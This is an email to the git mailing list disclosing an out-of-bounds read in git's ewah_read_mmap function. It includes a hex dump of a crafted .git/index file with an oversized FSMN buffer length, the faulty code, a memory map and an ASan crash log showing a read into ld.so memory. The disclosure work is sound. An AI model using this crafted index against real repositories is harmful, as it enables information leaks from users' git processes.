Return-Path: <git-owner@vger.kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on dcvr.yhbt.net
X-Spam-Level: 
X-Spam-ASN: AS31976 209.132.180.0/23
X-Spam-Status: No, score=-3.8 required=3.0 tests=BAYES_00,DKIM_SIGNED,
	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI,
	T_DKIM_INVALID shortcircuit=no autolearn=ham autolearn_force=no version=3.4.1
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by dcvr.yhbt.net (Postfix) with ESMTP id B126A1F403
	for <e@80x24.org>; Fri, 15 Jun 2018 00:16:32 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S965183AbeFOAQa (ORCPT <rfc822;e@80x24.org>);
        Thu, 14 Jun 2018 20:16:30 -0400
Received: from outbound26.reliablemail.org ([173.236.90.26]:47133 "EHLO
        outbound26.reliablemail.org" rhost-flags-OK-OK-OK-OK)
        by vger.kernel.org with ESMTP id S965126AbeFOAQ1 (ORCPT
        <rfc822;git@vger.kernel.org>); Thu, 14 Jun 2018 20:16:27 -0400
X-Greylist: delayed 4598 seconds by postgrey-1.27 at vger.kernel.org; Thu, 14 Jun 2018 20:16:27 EDT
Received: from chi16.stablehost.com ([108.163.233.90])
        by filter03.reliabledns.org with esmtps (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256)
        (Exim 4.89)
        (envelope-from <root@l4w.io>)
        id 1fTbDX-0007Sq-E7
        for git@vger.kernel.org; Thu, 14 Jun 2018 15:59:48 -0700
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=l4w.io;
        s=default; h=To:Date:Message-Id:Subject:Mime-Version:
        Content-Transfer-Encoding:Content-Type:From:Sender:Reply-To:Cc:Content-ID:
        Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
        :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
        List-Subscribe:List-Post:List-Owner:List-Archive;
        bh=fJGYM3UjjSt+sgGwy8pUHDxKOs+QriebNLhYhrRd2LU=; b=CfY2wchHaOQ56fYTEa5P/G+l6p
        LmxHo+5JEKes55Bb0qNAYEDi0I4U+u/FAuPrLk4RQbAy9nInH3pBhK0nxImXLjmK6Ga4ucBXxW6kF
        uvK74jzHN2vjan0Em0qA36OfuPMhVWJv8Urajl4yIXXKfcLQwgWBNCxIbBnBAV1ndP/gc7DpGGXRg
        UMUDb7xSwsiAx4Srt6lVsuAxIQRJwMrw4NZUmUwLZBpKLKuMZApcwVxyiEX9/CLogrS/p8mN4CECw
        uBc7bSUNCns7MpSvFGAxTgLkNKtrQwMu8/ldR+Sti9crCnB8dDmR/7JjhUt5I1idQca4puM2jGu0T
        RwwKDvhQ==;
Received: from [114.94.44.46] (port=34323 helo=[192.168.0.100])
        by chi16.stablehost.com with esmtpsa (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256)
        (Exim 4.91)
        (envelope-from <root@l4w.io>)
        id 1fTbDW-003IGI-GF
        for git@vger.kernel.org; Thu, 14 Jun 2018 15:59:47 -0700
From:   Luat Nguyen <root@l4w.io>
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
Mime-Version: 1.0 (Mac OS X Mail 10.3 \(3273\))
Subject: security: potential out-of-bound read at ewah_io.c |ewah_read_mmap|
Message-Id: <2067D731-C415-4D19-8CDA-90D7DC638397@l4w.io>
Date:   Fri, 15 Jun 2018 06:59:43 +0800
To:     git@vger.kernel.org
X-Mailer: Apple Mail (2.3273)
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - chi16.stablehost.com
X-AntiAbuse: Original Domain - vger.kernel.org
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - l4w.io
X-Get-Message-Sender-Via: chi16.stablehost.com: authenticated_id: root@l4w.io
X-Authenticated-Sender: chi16.stablehost.com: root@l4w.io
X-Source: 
X-Source-Args: 
X-Source-Dir: 
X-Originating-IP: 108.163.233.90
X-SpamExperts-Domain: outgoing.reliabledns.org
X-SpamExperts-Username: 108.163.233.90
Authentication-Results: reliabledns.org; auth=pass smtp.auth=108.163.233.90@outgoing.reliabledns.org
X-SpamExperts-Outgoing-Class: ham
X-SpamExperts-Outgoing-Evidence: Combined (0.15)
X-Recommended-Action: accept
X-Filter-ID: EX5BVjFpneJeBchSMxfU5gOUdlMz3/AqkhGqfSKrRv9602E9L7XzfQH6nu9C/Fh9KJzpNe6xgvOx
 q3u0UDjvOxjtoUCxoWwkMTV89iv9DSlX1rvnjyehFxXXpZmNaK+hYd87nsUrNdb6VPoL3erw1+KV
 se1sVhWabI0/+PN3sIKUYmhS9vAb5UElM+rK74Sbyy3/VETREI9bnzbFwyM1WR5hjsTbVRmo7nFM
 DV0g9AsNj3IsPxUoOvqBoVWc32LiNTMsyGd6siTfAwiecsng3DntvBtZWb7SxGaO73vXeYqPy4pL
 zcBjxmjH72ILbiTFKPGp/DIIBivDZ+qRALOR3HNViDWJv3U2BxTTTGZ/6SiN254k+ZTCmZvFvXk3
 wIxWuevuNfM1HjkNEFwape+IgNezYqxGMqsKjARq8PBC4qgnS70SMBDCZyJMmmGeq2/FB+ZvwAii
 5+KGUlu+KxK7VOccPtSRk0m/kQt358TQfZrY5Qx4fJOk03R5fJtf/Dv/RnUwbXV1CjvzulrM6HUw
 1qBiEItyVcM9v26rMWxfsL3PglfjhY6I3lE8eS1dhW4Vq5W5lRFbH3YfbLWaQatrzYPH+ADXhnpb
 I8UIZITrHIzMXwTwXkci2BuQQX+VHeG8hugzLSQQrzkoaTK+PfOFxj2WWq+8egk1lmfmuNjFlteC
 cMq34vP4r6iPtjXbC0tlKBWK6o3pvSUwpEGI2hZOBgv2Ff8VKzHdStRWF3DyexZhHN+ehLHsY8+Z
 n9jTHYDCctgzcDoFd+96Xw4QUNtTnRw7F6rE0OeWnug0EzEolJZGMzmMG/H9cn7piW7IPrZ713/1
 sz2zebZ0mvoQg7Jh+i5lYnZZDQtKt3QdIrO29a3r+fsTS1+yfNEq1BOL1ujF3UQDvlY0qz+z7Zm8
 Ft3S8PgpBGENDz5/Q0YkZSXU2tBCA4SrCDy7DpXK+0BtF49T5UaZAGHZJOM5ngSoVnJUl1TV8Hf+
 7DcwEuRCMGwDNDA=
X-Report-Abuse-To: spam@filter01.reliabledns.org
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org

Hi folks,

Recently, I=E2=80=99ve found a security issue related to out-of-bound =
read at function named `ewah_read_mmap`

Assume that, an attacker can put malicious `./git/index` into a repo by =
somehow.

Since there is lack of check whether the remaining size of `ptr`is equal =
to `buffer_size` or not.

So the code reads exceed the buffer of `ptr` and reach to higher page. =
In this case, it is `/lib/x86_64-linux-gnu/ld-2.23.so`.

Leads to infoleak. You can find more details and asan crash below.



# xxd .git/index
00000000: 4449 5243 0000 0002 0000 0000 4653 4d4e  DIRC........FSMN
00000010: 0000 0024 0000 0001 1538 2489 c8fc 3616  ...$.....8$...6.
00000020: 0000 0014 0000 0000 0000 2000 4141       .......... .AA
                                    ^ evil size here =3D 0x2000


***** SNIP CODE *****

int ewah_read_mmap(struct ewah_bitmap *self, const void *map, size_t =
len)
{
=E2=80=A6=20
	self->buffer_size =3D self->alloc_size =3D get_be32(ptr);
	ptr +=3D sizeof(uint32_t);
=E2=80=A6=20
	memcpy(self->buffer, ptr, self->buffer_size * sizeof(eword_t));


[memory map]

    0x7f990eca3000     0x7f990eca4000 r--p     1000 0      =
/media/sf_Fuzz/vuln_repo/.git/index <=E2=80=94 where `ptr` is placed
    0x7f990eca4000     0x7f990eca5000 r--p     1000 25000  =
/lib/x86_64-linux-gnu/ld-2.23.so <=E2=80=94 memcpy will reach here
    0x7f990eca5000     0x7f990eca6000 rw-p     1000 26000  =
/lib/x86_64-linux-gnu/ld-2.23.so <=E2=80=94 and here=20


[ ASAN log ]

root@guest:/media/sf_SHARE/vuln_repo# =
/media/sf_SHARE/git-master-asan/git status
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
=3D=3D4324=3D=3DERROR: AddressSanitizer: unknown-crash on address =
0x7f6f235b0000 at pc 0x0000004bba79 bp 0x7ffc75e68850 sp 0x7ffc75e68000
READ of size 65536 at 0x7f6f235b0000 thread T0
    #0 0x4bba78 in __asan_memcpy =
/tmp/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memint=
rinsics.cc:23:3
    #1 0x8c910e in ewah_read_mmap =
/media/sf_SHARE/git-master-asan/ewah/ewah_io.c:144:2
    #2 0x8e2534 in read_fsmonitor_extension =
/media/sf_SHARE/git-master-asan/fsmonitor.c:46:8
    #3 0xa05862 in read_index_extension =
/media/sf_SHARE/git-master-asan/read-cache.c:1615:3
    #4 0xa046f3 in do_read_index =
/media/sf_SHARE/git-master-asan/read-cache.c:1872:7
    #5 0xa03325 in read_index_from =
/media/sf_SHARE/git-master-asan/read-cache.c:1913:8
    #6 0xa03231 in read_index =
/media/sf_SHARE/git-master-asan/read-cache.c:1634:9
    #7 0x9de5e8 in read_index_preload =
/media/sf_SHARE/git-master-asan/preload-index.c:119:15
    #8 0x566cc6 in cmd_status =
/media/sf_SHARE/git-master-asan/builtin/commit.c:1358:2
    #9 0x4ede8c in run_builtin =
/media/sf_SHARE/git-master-asan/git.c:417:11
    #10 0x4ea939 in handle_builtin =
/media/sf_SHARE/git-master-asan/git.c:632:8
    #11 0x4ed655 in run_argv /media/sf_SHARE/git-master-asan/git.c:684:4
    #12 0x4ea037 in cmd_main =
/media/sf_SHARE/git-master-asan/git.c:761:19
    #13 0x759c8b in main =
/media/sf_SHARE/git-master-asan/common-main.c:45:9
    #14 0x7f6f2243382f in __libc_start_main =
(/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #15 0x41c268 in _start =
(/media/sf_SHARE/git-master-asan/git+0x41c268)

Address 0x7f6f235b0000 is a wild pointer.
SUMMARY: AddressSanitizer: unknown-crash =
/tmp/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memint=
rinsics.cc:23:3 in __asan_memcpy
Shadow bytes around the buggy address:
  0x0fee646adfb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fee646adfc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fee646adfd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fee646adfe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fee646adff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=3D>0x0fee646ae000:[fe]fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fee646ae010: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fee646ae020: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fee646ae030: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fee646ae040: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fee646ae050: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
=3D=3D4324=3D=3DABORTING
root@guest:/media/sf_SHARE/vuln_repo#


Regards,
Luat Nguyen.=
